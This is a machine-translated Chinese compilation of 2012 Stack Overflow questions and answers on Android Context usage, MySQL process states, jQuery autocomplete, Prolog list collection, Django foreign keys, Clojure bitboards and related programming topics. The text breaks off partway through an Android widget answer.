我是 android 新手，我正在尝试了解`getApplication()`、`getApplicationContext(`)和之间的区别`getBaseContext()`，尤其是何时在以下代码行中使用这些方法：`getContext()``someClass.this`

当我启动 toast 时，它们之间有什么区别，在哪些情况下我使用它们？

```
Toast.makeText(LoginActivity.this, "LogIn successful", Toast.LENGTH_SHORT).show();
Toast.makeText(getApplication(), "LogIn successful", Toast.LENGTH_SHORT).show();
Toast.makeText(getApplicationContext(), "LogIn successful", Toast.LENGTH_SHORT).show();
Toast.makeText(getBaseContext(), "LogIn successful", Toast.LENGTH_SHORT).show(); 
```

与意图相同：

```
Intent intent = new Intent(getApplicationContext(), LoginActivity.class);
Intent intent = new Intent(MenuPagina., LoginActivity.class);
Intent intent = new Intent(getBaseContext(), LoginActivity.class);
Intent intent = new Intent(getApplication(), LoginActivity.class); 
```

* * *

## 回答 #1

> 赞同：230
> 
> 时间：2012-04-27T08:30:31.207

**Toast**和**Intent**都需要参考*上下文*。而**getApplication**、**getApplicationContext**、**LoginActivity.this**和**getBaseContext**，它们都提供对上下文的引用。

现在令人困惑的是不同上下文的声明及其特定用法。为简单起见，您应该计算 Android 框架中可用的两种类型的上下文。

1.  应用程序上下文
2.  活动背景

**应用程序**上下文附加到应用程序的生命周期，并且在应用程序的整个生命周期中始终相同。因此，如果您使用*Toast*，则可以使用应用程序上下文甚至活动上下文（两者），因为可以从应用程序中的任何位置引发 toast 并且不附加到窗口。

**Activity**上下文附加到 Activity 的生命周期，并且可以在 Activity`onDestroy()`被引发时销毁。如果要启动一个新活动，则必须在其*Intent*中使用活动的上下文，以便新启动的活动连接到当前活动（在活动堆栈方面）。但是，您也可以使用应用程序的上下文来启动新活动，但是您需要设置标志`Intent.FLAG_ACTIVITY_NEW_TASK`以将其视为新任务。

*现在参考您的案例：*

`LoginActivity.this`虽然它指的是你自己的类，它扩展了 Activity 类，但基类（Activity）也扩展了 Context 类，所以它可以用来提供活动上下文。

`getApplication()`虽然它引用了 Application 对象，但 Application 类扩展了 Context 类，因此它可以用来提供应用程序上下文。

`getApplicationContext()`提供应用程序上下文。

`getBaseContext()`提供活动上下文。

> **提示：每当您需要操作时`Views`，请使用 *Activity-Context*，否则*Application-Context*就足够了。**

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-11-23T07:13:34.360

Waqas 的回答非常清楚和完整，但是我想进一步澄清使用`this`vs.`getBaseContext()`或`getApplication()`vs.之间的区别`getApplicationContext()`。两者`Activity`和`Application`都不是扩展`Context`自身，而是`ContextWrapper`，这是一个

> “它的代理实现`Context`只是将其所有调用委托给另一个`Context`”。

那个“真实”的上下文是你使用`getBaseContext()`.

因此，尽管`this`(for `Activity`) 和`getBaseContext()`两者都给出了活动上下文，但它们

*   (a) 不引用同一个对象 ( `this != getBaseContext()`) 和
*   (b) 调用上下文`this`的效率略低，因为调用经过了额外的间接级别。不过，我怀疑它是否有任何实际区别。

同样的逻辑适用于`getApplication()`vs. `getApplicationContext()`。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-27T08:32:10.580

```
LoginActivity.this 
```

上面的行是一个 Activity，它明显是一个 Context .. 当您创建一些 AlertDialogs 时使用它...在某些地方，您必须使用 Activity Context ...

```
getApplication() 
```

同样这里 make text 方法需要 Context 和 Application 本身实现`Context`

```
getApplicationContext() 
```

这是最首选的方式，因为它会一直`Context`持续到应用程序关闭。

```
getBaseContext() 
```

此上下文可用于小部件和视图..

但是它们都给出了一个**Context**对象，没有别的了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-24T05:30:41.253

Class.this 如果您的类扩展 Activity 使用 getapplication() 使用参考应用程序和应用程序扩展应用程序上下文 getbasecontext() 参考您的活动上下文上下文参考您的活动生命周期上下文 applicationcontext 参考您的应用程序生命周期

# objective-c - ios中的标签文本更明亮

> ID：10347187
> 
> 赞同：0
> 
> 时间：2012-04-27T08:19:33.550
> 
> 标签：objective-c, xcode

我正在创建一个带有标签的图片库，其中标签背景不透明。我成功地将文本放在标签上方。问题是文本颜色不够亮。我的文本颜色是白色..但它缺乏亮度这是必需的，你们能帮我吗？下面是代码。

```
 label=[[UILabel alloc]init];

    label.frame = CGRectMake(column*248, row*175+415, 242, 70);
    label.text=[story objectAtIndex:i];
    label.font=[UIFont boldSystemFontOfSize:21];
    label.alpha=0.5;
    label.backgroundColor=[UIColor blackColor];
    //label.backgroundColor=[UIColor clearColor];
    label.textColor=[UIColor whiteColor];
    label.textAlignment=UITextAlignmentLeft;
    label.numberOfLines=2;
    [view1 addSubview:label]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:21:35.580

整个标签的 alpha 值为 0.5。这也抑制了字体颜色。您可以简单地将标签的背景设置为 alpha 值为 0.5 的颜色，那么文本仍应为 alpha 1.0。

```
label.alpha = 1.0;  // is already the default
label.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.5]; 
```

# vb.net - 对话框名称

> ID：10347190
> 
> 赞同：2
> 
> 时间：2012-04-27T08:19:48.953
> 
> 标签：vb.net

有人知道下面的对话框吗？

![图片](../Images/0fddfca5af8be394dc63bb3f38d2e583.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:27:38.370

它被称为[**组件托盘**](http://msdn.microsoft.com/en-us/library/e06hs424.aspx)。

> 添加到 Windows 窗体设计器中的非可视组件放置在位于设计图面下方的**组件托盘**上，以便可以轻松访问它们而不会弄乱可视化设计空间。

# iphone - 停止旋转 youtubevideo 播放器 ios sdk

> ID：10347192
> 
> 赞同：3
> 
> 时间：2012-04-27T08:20:03.867
> 
> 标签：iphone, objective-c, ios, ios4, youtube

我的应用程序仅支持纵向模式。[我在嵌入式 HTML (LoadHTML)（如： http](http://www.youtube.com/watch?v=3F1_04GLrPs) ://www.youtube.com/watch?v= 3F1_04GLrPs）的帮助下播放了你的管视频 ，即使在旋转后它也能正常工作。但现在我正在播放所有准备好的嵌入式视频（如： [http](http://www.youtube.com/embed/3F1_04GLrPs) ://www.youtube.com/embed/3F1_04GLrPs ）与（LoadRequist）它正在播放视频但在将iPhone旋转到横向并按下完成后它也会旋转我的视图控制器横向，而我的应用程序仅支持纵向模式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:38:38.653

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation{

    // Return YES for supported orientations

    return (interfaceOrientation == UIInterfaceOrientationPortrait);
} 
```

# mysql - MySQL处于“正在发送数据”状态是什么意思？

> ID：10347193
> 
> 赞同：180
> 
> 时间：2012-04-27T08:20:04.227
> 
> 标签：mysql

如果Mysql查询是什么意思：

```
SHOW PROCESSLIST; 
```

在状态列中返回“发送数据”？

我想这意味着查询已经执行并且 MySQL 正在向客户端发送“结果”数据，但我想知道为什么它需要这么多时间（最多一个小时）。

谢谢你。

* * *

## 回答 #1

> 赞同：281
> 
> 时间：2012-04-27T09:17:20.007

这是一种相当误导的状态。它应该被称为“读取和过滤数据”。

这意味着`MySQL`有一些数据存储在磁盘（或内存）上，尚未被读取和发送。它可能是表本身、索引、临时表、排序输出等。

如果您有一个仅需要一条记录的 1M 记录表（没有索引），`MySQL`则在扫描表时仍会输出状态为“正在发送数据”，尽管事实上它尚未发送任何内容。

> *MySQL 8.0.17 及更高版本*：此状态不再单独表示，而是包含在*Executing*状态中。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-07-08T07:33:03.597

在这种状态下：

> 该线程正在***读取和处理 SELECT 语句的行***，并将数据发送到客户端。
> 
> 因为在此状态期间发生的操作往往会执行 **大量磁盘访问（读取）**。

这就是为什么它需要更多时间来完成，因此在给定查询的生命周期中**运行时间最长的状态也是如此。**

# jquery - 在 jquery 自动完成中使用服务器上的 json 数据

> ID：10347195
> 
> 赞同：0
> 
> 时间：2012-04-27T08:20:09.947
> 
> 标签：jquery, json

[我在http://www.abcd.com/friends.json](http://www.abcd.com/friends.json)上有以下数据（这不是一个真正的链接，但我在我的项目中使用的是一个真实的链接，我可以连接到服务器）：

```
{John, Kyle, Abby, Greer, Rob, Cathy} 
```

我有以下脚本来自动完成文本字段：

```
$(function() {
    $("input#autocomplete").autocomplete({
    source: $.getJSON("http://www.abcd.com/friends.json")
});
  }); 
```

或者

```
$(function() {
  var friendList = null;
  $.getJSON("http://www.abcd.com/friends.json", function(data){
     friendList = data;
     $("#friend" ).autocomplete({
    source: friendList
    });
  });
}); 
```

我究竟做错了什么？如果没有从远程服务器调用 json 对象，这两个代码都可以工作 感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:22:23.980

您的 JSON 无效。可能你想要这样的东西：

```
[ 'John', 'Kyle', 'Abby', 'Greer','Rob', 'Cathy' ] 
```

另一个可能的错误（正如 JiDai 在评论中提到的）可能是您从另一台服务器获取 JSON，而不是为您的页面提供服务。在这种情况下，要么将您的 JSON 移动到同一服务器，要么实现一些[CORS](http://enable-cors.org/)模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:24:02.173

您能否将“source”替换为“serviceUrl”

```
$(function() {
    $("input#autocomplete").autocomplete({
    serviceUrl: "http://www.abcd.com/friends.json"
    });
}); 
```

# android - E/Environment(17152)：getExternalStorageState/mnt/sdcard - logcat 出错，但为什么？

> ID：10347197
> 
> 赞同：3
> 
> 时间：2012-04-27T08:20:10.703
> 
> 标签：android, android-sdcard, android-logcat, android-file

嗨，我在 logcat 中遇到了这个错误：

```
04-27 10:16:12.160: E/Environment(17152): getExternalStorageState/mnt/sdcard 
```

我只是到达 sdcard 来保存和加载一些图像，一切正常，没有错误，没有崩溃，我只是被 logcat 惹恼了......为什么它被标记为“E” - 错误？

# c# - 在 4 中使用 3.5 组件

> ID：10347204
> 
> 赞同：3
> 
> 时间：2012-04-27T08:20:33.070
> 
> 标签：c#, .net, c#-4.0, .net-4.0, .net-3.5

我有一个在使用 .Net framework 3.5 时可以完美运行的程序集，但是在 4 中使用它时会出现无法加载程序集的错误。有谁知道这个问题的解决方案？（无论如何我都不能更改程序集或更改项目目标框架，因为这会删除应用程序的目的）编程代码是 c#。

基本上：我正在.Net 4 框架中创建一个应用程序，但程序集与它不兼容。

以下错误：具有混合模式的程序集是使用运行时版本 v2.0.50727 创建的，如果没有运行时版本 4.0 中的额外配置信息，则无法加载。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T08:27:42.080

最好的方法可能是在 Visual Studio 2010 中为 .NET 4.0 重新编译您的类库（即打开项目、转换它并更改目标框架。）

如果您不能或不会这样做，那么您可以尝试将以下内容添加到您的 .NET 4.0 应用程序的 app.config 文件中：

在 app.config 中添加此配置。

```
<?xml version="1.0"?>
<configuration>
  <startup useLegacyV2RuntimeActivationPolicy="true">
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
  </startup>
</configuration> 
```

关键是 useLegacyV2RuntimeActivationPolicy 标志。这会导致 CLR 使用最新版本 (4.0) 来加载您的混合模式程序集。没有这个，它就行不通。

请注意，这只对混合模式 (C++/CLI) 程序集很重要。您可以加载所有托管的 CLR 3.5 程序集，而无需在 app.config 中指定。

# list - 如何在序言中返回单个答案列表（而不是多个单独的答案）？

> ID：10347206
> 
> 赞同：1
> 
> 时间：2012-04-27T08:20:39.763
> 
> 标签：list, prolog, combinations

我有一个返回多个答案的序言定义。我想代替这个，返回一个包含所有可能答案的列表。

例如

```
alpha;
beta;
gamma;
delta; 
```

到

```
[alpha, beta, gamma, delta]; 
```

这怎么能在序言中完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:35:10.093

请注意，根据您的具体需要，`findall/3`可能不适合：

考虑与自由变量成员`test/2 : test(+L, -E)`统一的谓词：`E``L`

```
test(L, E) :-
    member(E, L),
    var(E). 
```

现在，假设您想使用此谓词查找列表的所有自由变量（注意：如果您真的想这样做，那不是正确的方法，它只是指出一种`findall/3`行为）：

```
?- findall(X, test([A, 3, C], X), Xs).
Xs = [_G32, _G29]. 
```

`findall/3`给你一个很好的答案，但是模数是一个变量重命名！

```
?- bagof(X, test([A, 3, C], X), Xs).
Xs = [A, C]. 
```

或者

```
?- setof(X, test([A, 3, C], X), Xs).
Xs = [A, C]. 
```

做的伎俩虽然。

我不确定我在这里所说的是否适用于 SWI-Prolog 以外的其他 Prolog 系统。

这是相应的[文档页面](http://www.swi-prolog.org/pldoc/doc_for?object=section%282,%274.29%27,swi%28%27/doc/Manual/allsolutions.html%27%29%29)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:24:55.837

通过使用`findall`. 你有`somepred(X)`它给你指定的答案。现在尝试运行`findall(X,somepred(X),List)`以查看`List`统一的所有答案列表。

***编辑：***如所问，在问题的上下文中使用`setof`or`bagof`代替`findall`

`setof`显然是错误的，因为它跳过了恰好是重复的有效解决方案。当没有解决方案时`bagof` *失败*`findall`，同时正确地*“返回”*一个空列表`[]`（按照 OP 的要求）。哦，还有自由变量的替代绑定`bagof`和`setof` *回溯*，而 OP 明确要求*“返回”*一个解决方案*列表*，即***没有回溯***。以机智：

 **```
?- [user].
|: test(L,E):- member(E,L),var(E).
|: 
% user://2 compiled 0.00 sec, 124 bytes

Yes
?- findall(X, (test([A,3,A],X) , member(A,[1,2]) )   , Xs).

X = _G546
A = _G536
Xs = [1, 2, 1, 2] ;

No
?- bagof(X, (test([A,3,A],X) , member(A,[1,2]) )     , Xs).

X = _G534
A = 1
Xs = [1, 1] ;

X = _G534
A = 2
Xs = [2, 2] ;

No
?- 
```

但 OP 要求返回*“包含所有可能答案的单一列表”*。

***编辑：***没有答案时的所有答案列表是一个空列表。**

# python - Django外键：获取相关模型？

> ID：10347210
> 
> 赞同：18
> 
> 时间：2012-04-27T08:20:49.107
> 
> 标签：python, django, django-models, foreign-keys

是否可以通过外键字段本身获取外键的相关模型？

例如，如果我有 3 个模型：

```
class ModelA(models.Model)
    field1 = models.CharField(max_length=10)

class ModelB(models.Model)
    field1 = models.CharField(max_length=10)

class ModelC(models.Model)
    field1 = models.CharField(max_length=10)
    field2 = models.ForeignKey(ModelA)
    field3 = models.ForeignKey(ModelB) 
```

我想做：

```
for field in ModelC._meta.fields:
    if field.get_internal_type() == "ForeignKey":
        #get the related model for field e.g. ModelA or ModelB 
```

这是否可能仅使用模型本身而不是模型的实例？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-04-27T08:29:39.783

如果 ModelA 有一个名为“foo”的 FK 字段，那么您可以通过以下方式获取相关模型：

```
ModelA._meta.get_field('foo').rel.to 
```

使用您的代码，它看起来像：

```
for field in ModelC._meta.fields:
    if field.get_internal_type() == "ForeignKey":
        print field.rel.to 
```

如果很久以前在 shell 中使用 tab 补全发现它，它仍然有效。您可能想学习使用 shell 对类似的东西进行逆向工程。

## Django>=2.0 用户的更新

语法已更改。使用以下代码获取相关模型：

```
ModelA._meta.get_field('foo').related_model 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-13T19:14:31.307

当试图提取这样的关系时，我使用了大量的命令行实验。我使用的一个常见模式是`_=starting_point.<chained_attributes>;pprint((_, dir(_)))`. 例如：

```
_=ModelC;pprint((_, dir(_)))
_=ModelC.field2;pprint((_, dir(_)))
_=ModelC.field2.field;pprint((_, dir(_)))
_=ModelC.field2.field.rel;pprint((_, dir(_)))
_=ModelC.field2.field.rel.to;pprint((_, dir(_))) 
```

（你需要先做`from pprint import pprint`，自然。）这让我可以尝试添加/删除属性，直到找到我想要的项目......同时清楚地看到我拥有什么以及下一个级别可用的内容。由此，我得到 `ModelC.field2.field.rel.to == ModelA`. 相同的基本模式可用于探索反向关系、多对多关系、从实例而不是类开始等。

# java - 如果未找到实体，则为空对象

> ID：10347218
> 
> 赞同：6
> 
> 时间：2012-04-27T08:21:27.420
> 
> 标签：java, hibernate, jpa

我正在使用 Hibernate 和 JPA。我有一个名为的实体`Customer`引用 a `ParentCustomer`：

```
public class Customer {
    @Id
    @GeneratedValue
    @Column(name = "CustomerID")
    private int id;

    @ManyToOne
    @JoinColumn(name = "ParentCustomerID")
    private Customer parent;

    // ...
} 
```

但是在我的数据库中，有些客户没有父母，所以`ParentCustomerID`设置为`0`. 当我测试我的课程时，我得到的例外是：

`javax.persistence.EntityNotFoundException: Unable to find it.keyforup.pat.data.entities.Customer with id 0`

有没有办法将id设置`ParentCustomer`为？`null``0`

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-27T08:43:10.423

试试这个

```
@ManyToOne
@JoinColumn(name = "ParentCustomerID")
@NotFound(action = NotFoundAction.IGNORE)
private Customer parent; 
```

# c# - 如何访问服务器控件，例如。aspx页面中的文本框值？

> ID：10347219
> 
> 赞同：0
> 
> 时间：2012-04-27T08:21:27.950
> 
> 标签：c#, asp.net, .net

我可以在 aspx 设计页面中访问服务器控件值吗？现在这只是我的好奇心，但明天左右可能需要。例如，我在 aspx 页面中有一个标签，我想为它分配一个文本框值。

我知道我可以改用 aspx.cs 文件，但任何需要的建议都将非常受欢迎。

提前致谢...... ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:26:26.317

有很多方法。

1) var txtbox = Document.getElementbyId("<%= texboxId.ClientID%>"); txtbox.value = "新";

2) var txtbox = $("#" + "<%= texboxId.ClientID%>"); txtbox.value = "新";

3) var txtbox = $get("texboxId"); txtbox.value = "新";

如果您使用的是 Asp.Net 4.0，那么简单的方法是

```
<asp:TextBox runat="server" ID="txtboxId" ClientIDMode="Static" /> 
```

并直接访问它而不使用 ClientID。

1) var txtbox = Document.getElementbyId("txtboxId"); txtbox.value = "新";

2) var txtbox = $("#txtboxId"); txtbox.value = "新";

对于数字 2，您需要 Jquery，对于数字 3，您需要 Microsoft AJAX 库。

# openssl - OpenSSL 二进制分发：版本末尾字符的含义

> ID：10347221
> 
> 赞同：6
> 
> 时间：2012-04-27T08:21:31.077
> 
> 标签：openssl

我正在使用依赖于 OpenSSL 的 libcurl，因此我也需要链接它。

[这里](http://slproweb.com/products/Win32OpenSSL.html)有适用于 Windows 的二进制发行版，但我不明白版本末尾的字符代表什么（名称如下的软件包：Win32 OpenSSL v1.0.1b、Win32 OpenSSL v1.0.0i、...）。

我可能会错过一些东西，但快速潜伏在网站/页面上并没有对此做出任何解释。

它们之间有什么区别？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T08:28:20.923

请参阅[OpenSSL 支持常见问题解答 8：版本控制方案如何工作？](http://www.openssl.org/support/faq.html#MISC8)：

> 在 OpenSSL 1.0.0 发布后，版本控制方案发生了变化。**Letter 版本（例如 1.0.1a）只能包含错误和安全修复，没有新功能。**次要版本更改了最后一个数字（例如 1.0.2），并且可以包含保留二进制兼容性的新功能。对中间数字的更改被视为主要版本，并且不保证源代码和二进制兼容性。

# java - 客户端的@queryparam 值分配

> ID：10347223
> 
> 赞同：2
> 
> 时间：2012-04-27T08:21:44.897
> 
> 标签：java, rest, jersey

我必须从客户端 java 类调用一个安静的 Web 服务。

我需要传递 HashMap、Strings，它必须返回一个 bean 列表。我正在使用 jersey restful web 服务

我的 REST 服务是这样的：

```
@put

public List<MilestoneDetailsBean> getMPPReader(
        @QueryParam("username") String username,
        @QueryParam("projid") String projid,
        @QueryParam("mppfile") File file,
        @QueryParam("dbtemplate") Map<String,Integer> dbtemplate) 
```

有人可以帮我解决我怎么能：

1.  在我的客户端 java 代码中为这些查询参数赋值
2.  我应该为我的 Web 服务设置什么类型的生产和消费参数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:31:20.350

1) 取决于您如何创建查询。`QueryParams`是 URL 后面的那些部分`?`：`?key=value&key2=value2`

因此，您可以做的就是将键和值附加到请求 URL。请记住对值进行编码。

喜欢：`http://mydomain/service?username=hage&projid=hello+world&mppfile=myfile.txt`

地图不能用于此。[看这里](http://jersey.java.net/nonav/apidocs/latest/jersey/javax/ws/rs/QueryParam.html)

2) 不知道。`Produces`绝对取决于您要如何返回数据（如 xml、json 等），并`Consumes`取决于您要发送到服务器的数据

通常，对于客户端，存在 Jersey 客户端 API。还没用过，你可以[看看](http://jersey.java.net/nonav/documentation/latest/user-guide.html#d4e609)。

# c# - 创建一个保存属性然后调用 GetCustomAttributes 不起作用

> ID：10347238
> 
> 赞同：0
> 
> 时间：2012-04-27T08:23:26.313
> 
> 标签：c#, .net, wpf

```
public class MainViewModel
{
    [Save]
    public String Name { get; set; }

    public MainViewModel()
    {
        Name = "qwe asd zxc";
        LoadProperties(this);
    }    

    public void LoadProperties(object viewModel)
    {
         var properties = viewModel.GetType().GetCustomAttributes(typeof(Save),false);
    }
}

public class Save : Attribute{} 
```

加载属性方法中的属性变量有 0 项我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:27:34.970

这应该工作

```
var properties = viewModel.GetType()
    .GetProperties()
    .Where(p => p.GetCustomAttributes(typeof(Save),false).Any())
    .ToArray(); 
```

# java - 我应该如何在 clojure 中表示国际象棋位板？

> ID：10347240
> 
> 赞同：7
> 
> 时间：2012-04-27T08:23:28.373
> 
> 标签：java, clojure, chess

在 Clojure (/Java) 中表示棋盘的可能方式有哪些？

[http://pages.cs.wisc.edu/~psilord/blog/data/chess-pages/rep.html](http://pages.cs.wisc.edu/~psilord/blog/data/chess-pages/rep.html)

我需要能够访问各个位并执行按位运算。

我想过使用 java.lang.Long 但这会导致 1x10^63 出现问题，因为标牌。我也不确定如何访问特定索引处的位？

我还查看了 BitSet，但理想情况下我需要一个固定的长度。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T11:45:30.400

没有理由不能使用直长。正如您所指出的，问题在于 java（以及因此 clojure）的 long 是有符号的，仅允许 63 位用于正数

默认情况下，Java 允许算术溢出而不会出错。默认情况下，Clojure 不允许算术溢出而没有错误（参见[*unchecked-math*](http://clojuredocs.org/clojure_core/clojure.core/%2aunchecked-math%2a)标志）。它增加了对算术运算和强制转换的额外检查，因此例如`(byte 128)`会导致异常。由于 clojure v1.3.0 有类似的功能`(unchecked-byte)`相当于 java 功能....

```
(unchecked-byte 128)
;=> -128 ; 2s-complement of 10000000
(unchecked-byte 2r10000001)
;=> -127 ; 2s-complement of 10000001 
```

有大量`unchecked-*`可用的操作（[请参阅 clojuredocs](http://clojuredocs.org/search?x=0&y=0&q=unchecked&lib=clojure_core)）。

如果您使用直长并且`unchecked-*`您大部分都在那里进行操作，那么您可以使用这些`bit-*`操作来旋转/检查位。

最后将你的棋盘存储在一个原子中是有意义的，然后你更新它`(swap! chessboard fn args)`

**（更新于 13 年 2 月 15 日，使用更惯用的交换！调用）**

例如

```
(inc Long/MAX_VALUE) ; java.lang.ArithmeticException

(unchecked-inc Long/MAX_VALUE) ; wraps.
-9223372036854775808

(def chessboard (atom 0))
@chessboard
;=> 0
(bit-test @chessboard 1)
;=> false
(swap! chessboard bit-flip 1)
;=> 2
(bit-test @chessboard 1)
;=> true
@chessboard
;=> 2
(reset! chessboard 0)
;=> 0
(swap! chessboard bit-flip 63)
;=> -9223372036854775808 
(bit-test @chessboard 63)
;=> true 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T10:31:15.823

```
=> (def chessboard (byte-array 8))
#'user/chessboard

=> (vec chessboard)
[0 0 0 0 0 0 0 0]

=> (for [row (range 8)] (aset-byte chessboard row (rand-int 8)))
(3 0 6 6 2 3 6 7)

=> (bigint chessboard)
216179404987106823N

=> (defn bigint-to-array
 [bi]
 (.toByteArray (biginteger bi)))

=> (vec (bigint-to-array 216179404987106823N))
[3 0 6 6 2 3 6 7] 
```

Clojure 以这种方式支持您需要的大多数功能。像所有 clojure 数字一样，clojure.lang.BigInt 支持二进制操作（位等）。在字节数组上，您可以使用[java.util.Arrays 中](http://docs.oracle.com/javase/1.6/docs/api/java/util/Arrays.html)的所有方法（搜索、填充、排序）。

注意 bigint fn 强制转换为 clojure.lang.BigInt，而 biginteger fn 强制转换为 java.math.BigInteger。如果你想使用[java.math.BigInteger](http://docs.oracle.com/javase/1.6/docs/api/java/math/BigInteger.html)的方法，你需要通过 biginteger 强制你的 bigint 或字节数组。

# algorithm - 区间树遍历

> ID：10347243
> 
> 赞同：1
> 
> 时间：2012-04-27T08:23:42.413
> 
> 标签：algorithm, data-structures, interval-tree

这是我为遍历区间树而编写的函数。我注意到它无法访问某些节点。假设代码很清楚，我想知道它在哪里失败。

```
public boolean searchTree(Node node,int x)
{

            while(node!=null&&!node.getInterval().containsPoint(x))
            {
                if(node.getNodeLeft()!=null&&(node.getNodeLeft().getMax()>=x))
                {
                    node=node.getNodeLeft();
                }
                else
                {
                    node=node.getNodeRight();
                }       
            }
           return node!=null;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:40:23.140

树中的任何节点都以一个点为中心，比如 p。左子树包含 p 左侧的所有区间，右子树包含 p 右侧的所有区间。节点本身包含所有与 p 重叠的区间。

现在，如果您的 x < p，则可能存在来自左子树的区间，其中包含 x，但也可能存在来自节点本身的区间，其中包含 x（和 p）。唯一的保证是右子树不会包含包含 x 的区间。

所以你错过了节点本身的那些间隔。

我不知道区间树是什么，所以我的理解来自这里[http://en.wikipedia.org/wiki/Interval_tree](http://en.wikipedia.org/wiki/Interval_tree)

# android - 运行繁重的应用程序时丢失小部件数据

> ID：10347246
> 
> 赞同：3
> 
> 时间：2012-04-27T08:24:16.080
> 
> 标签：android, android-widget

我为我的应用程序创建了一个小部件。一切正常，小部件中显示的所有数据都正确显示。但是有时，当我运行其他应用程序（例如相机）并开始拍摄视频几秒钟并停止视频并关闭相机时会发生什么，然后突然在我的小部件中显示的所有数据都丢失了，并且在小部件中什么也没有显示. 我不知道在我在 Android 2.3.3 中运行我的应用程序之前是否会出现问题，但是当我将手机更新到 Android 4.0 时，这个问题就出现了。

丢失的数据再次显示为根据我设置的时间间隔更新的小部件。所以我的问题是为什么会发生这种数据丢失，这是我必须在我的代码中做的事情。请帮我解决这个问题。

**我用过的代码**

**Widget_app_provider.xml 文件**

```
<?xml version="1.0" encoding="utf-8"?>
<appwidget-provider xmlns:android="http://schemas.android.com/apk/res/android"
    android:initialLayout="@layout/widget_layout"
    android:minHeight="56dp"
    android:minWidth="56dp"
    android:updatePeriodMillis="2100000" /> 
```

**WidgetLayout.xml 文件**

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/widget"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="@drawable/appwidget_bg_clickable" >

    <ImageView
        android:id="@+id/backgroundImage"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:contentDescription="@string/tracking_status_faq_imageview_text"
        android:scaleType="fitXY" />

    <LinearLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:gravity="center_horizontal|center_vertical" >

        <TextView
            android:id="@+id/txt_date"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="#5f5f5f"
            android:textSize="14dp" >
        </TextView>
    </LinearLayout>

</RelativeLayout> 
```

**小部件.java 文件**

```
public class Widget extends AppWidgetProvider implements Utilities
    {
    @Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] appWidgetIds) 
    {      
        // Read data from register before  updating the widget
        CycleManager.getSingletonObject().readHistoryDateFromFile(context);
        CycleManager.getSingletonObject().ComputeAverages();

        // To prevent any ANR timeouts, we perform the update in a service
        context.startService(new Intent(context, UpdateService.class));
    }

    public static class UpdateService extends Service 
    {
        @Override
        public void onStart(Intent intent, int startId) 
        {
            // Build the widget update for today
            RemoteViews updateViews = getValueFromCycleManager(this);

            // Push update for this widget to the home screen
            ComponentName thisWidget = new ComponentName(this, Widget.class);
            AppWidgetManager manager = AppWidgetManager.getInstance(this);
            manager.updateAppWidget(thisWidget, updateViews);
        }

        @Override
        public IBinder onBind(Intent arg0){
            // TODO Auto-generated method stub
            return null;
        }
        public RemoteViews getValueFromCycleManager(Context context) 
        {
            RemoteViews remoteViews = null;
            remoteViews = new RemoteViews(context.getPackageName(), R.layout.widget_layout);

            Date currentDate = calInstance.getTime();

            // set No of days remaining for next cycle start to the widgets 
            Date dtStart = CycleManager.getSingletonObject().getStartDate();
            int iAvgCycleLength = CycleManager.getSingletonObject().getAvgCycleTime();

            calInstance.setTime(dtStart);
            calInstance.add(Calendar.DATE, iAvgCycleLength);            
            Date dtNextCycleDate = calInstance.getTime();   

            Long noOfDaysLeft = dtNextCycleDate.getTime()- currentDate.getTime();
            noOfDaysLeft = ((noOfDaysLeft / (1000 * 60 * 60)) + 1) / 24;

            remoteViews.setTextViewText(R.id.txt_date, Long.toString(noOfDaysLeft));        
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T10:36:56.080

尝试实现一个`IntentService`应该更好地处理被杀死的方法。您需要按照`onHandleIntent`您在 中指定的意图进行调用的工作`context.startService(new Intent(context, UpdateService.class));`。

```
public static class UpdateService extends IntentService 
{

    public UpdateService() 
    {
        super("UpdateService");
    }

    @Override
    protected void onHandleIntent(Intent intent)
    {
        // Build the widget update for today
        RemoteViews updateViews = getValueFromCycleManager(this);

        // Push update for this widget to the home screen
        ComponentName thisWidget = new ComponentName(this, Widget.class);
        AppWidgetManager manager = AppWidgetManager.getInstance(this);
        manager.updateAppWidget(thisWidget, updateViews);
    }

    public RemoteViews getValueFromCycleManager(Context context) 
    {
        RemoteViews remoteViews = null;
        remoteViews = new RemoteViews(context.getPackageName(), R.layout.widget_layout);

        Date currentDate = calInstance.getTime();

        // set No of days remaining for next cycle start to the widgets 
        Date dtStart = CycleManager.getSingletonObject().getStartDate();
